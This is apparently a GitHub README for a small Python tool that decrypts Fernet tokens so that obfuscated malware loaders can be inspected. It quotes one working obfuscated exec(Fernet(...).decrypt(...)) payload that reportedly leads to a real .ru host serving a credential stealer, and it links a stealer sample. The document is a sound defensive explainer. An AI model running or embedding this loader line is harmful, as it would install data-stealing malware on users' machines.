# Fernet Decrypter
## Overview
this code is simply to decode any type of fernet code that would usually run malware on your computer using python.
fernet is not only used to run malicious software keep that in mind. i am just giving an example 

## example of malicious code
`;exec(Fernet(b'q7MBuNUXpnt4GH9rHx3rNM1_HFsACuJIk1ZCLPBpU7I=').decrypt(b'gAAAAABk8g4eRFjyGDEmrLhaqqcXsILFNwp4eMaESVA1JWnfoVNhhSPBV_1ngtqebygT9MrIQ95jI1aR1fTfmknlOBY_bumaE8dAZ4WotYGKn0K-cRje6R3Ny4G75lRs8bgV5vv50fD0DtiWTKVsT4VP_FeUHA3so_StnOnG-rgPUWkIgiaX9UdRExOsX0eSqzHxP-88zENWuWdYNOflCmEDVdYOhuxYSg=='))`

if we break this code down it shows the normal python type of execution which is using a fernet key and an encrypted message to decoded a message using fernet library. when this code is ran through the decrypter it prints out a website `https://bananasquad.ru/paste`. when entering this site it shows again the same method of execution but now with a much longer encrypted message which when decoded shows a malicious python code that will steal every data on your computer such as passwords, credit card, discord credentials and so on. after downloading the stealer file ([stealer example](https://github.com/Nezar187/Fernet-Decrypter/blob/main/example%20stealer/stealer.py)) it reruns the fernet request with a new token and key.

# conclusion
simply never run any type of python code without looking for hidden execution methods.
this repository is just to inform about malicious injections from fernet.
FERNET IS NOT A VIRUS WHATSOEVER ITS THE TYPE OF MESSAGE OR CODE THAT IS RAN IN IT WHICH IS MALICIOUS


# usage

## requirements
- **Python:** Ensure that Python (version 3.x) is installed on your system.
- **Libraries:** Make sure the `cryptography` library is installed.
  ```bash
  pip install cryptography
  ```

## How to Use
1. **Running the Script:** Execute the Fernet Decrypter script from your command line or terminal.
   ```bash
   python fernet_decrypter.py
   ```
2. **Input:** You will be prompted to enter the Fernet key and the token that you wish to decrypt.
3. **Output:** The decrypted message will be displayed.

## Detailed Description
Fernet Decrypter operates by taking a Fernet encrypted token and the corresponding key as inputs. Utilizing the cryptography library, it decrypts the token, revealing the original message. The tool is straightforward to use, requiring minimal setup and user input, making it suitable for users with various levels of technical expertise.

## Usage Example
```bash
python fernet_decrypter.py
```
the decoded message will be printed on the console

# INFORMATION
PLEASE NOTE THAT YOU SHOULD NOT VISIT THIS SITE OR RUN ANY SCRIPT. I MADE THIS REPOSITORY FOR EDUCATIONAL PURPOSES AND TO INFORM YOU HOW A SIMPLE BUT BAD INJECTION USING FERNET IS DONE.
AGAIN FERNET IS NOT BAD, ONLY THE MESSAGES OR WHAT IS EXECUTED THROUGH IT
